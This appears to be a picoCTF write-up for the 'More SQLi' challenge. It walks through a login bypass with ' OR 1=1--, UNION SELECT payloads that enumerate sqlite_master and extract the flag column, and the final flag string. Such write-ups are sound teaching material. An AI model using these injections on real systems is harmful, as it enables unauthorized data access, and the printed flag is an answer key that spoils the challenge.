# More SQLi (Medium)

## Description
Can you find the flag on this website.
Try to find the flag [here](http://saturn.picoctf.net:53542/).

- Hints
  - SQLiLite

Challenge Link: https://play.picoctf.org/practice/challenge/358
---


## Solution
### 1. Launch instance and visit the website 
<img width="1002" height="670" alt="image" src="https://github.com/user-attachments/assets/e1d9cafa-a36a-4126-bbde-e8fb21df905d" />

### 2. Attempt
I try to login using username and password `admin`.
```
username: admin 
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin '
```
### 3. Using `' OR 1=1--` SQL injection for password
```
username: 123
password: ' OR 1=1--
SQL query: SELECT id FROM users WHERE password = '' OR 1=1-- ' AND username = '123'
```
This injection works because `' OR 1=1--` turns the condition into always true `(1=1)`, and the `--` comment symbol cuts off the rest of the SQL query, including the username check. So the system skips authentication and grants access.

### 4.  Enumerate All Table and Column Names
Type this in the search bar and there is a `flag` column in `more_table` table.
```
' UNION SELECT sql,NULL,NULL FROM sqlite_master-- -
```
<img width="1342" height="1160" alt="image" src="https://github.com/user-attachments/assets/d06c69f8-0034-4e49-960a-dcc9a98014f9" />

### 5. Extract the Flag from `more_table`
Now that we know the table and column names, we can craft another injection to extract actual data. This payload selects the `id` and `flag` columns from the `more_table`:
```
' UNION SELECT id,flag,NULL FROM more_table-- -
```

<img width="1682" height="966" alt="image" src="https://github.com/user-attachments/assets/f4776745-7ca4-4d04-a94f-a44f01c6a65f" />

## Flag
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
```
